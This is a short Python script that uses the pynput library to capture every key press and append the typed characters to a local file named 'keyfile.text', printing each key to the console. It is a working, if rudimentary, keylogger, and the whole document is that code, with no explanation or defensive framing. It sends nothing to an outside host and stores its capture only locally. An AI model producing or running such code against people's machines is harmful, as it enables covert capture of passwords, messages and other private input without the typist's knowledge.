from pynput import keyboard

def pressedKey(key):
    print(str(key))
    with open("keyfile.text", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__=="__main__":
    listener = keyboard.Listener(on_press=pressedKey)
    listener.start()
    input() 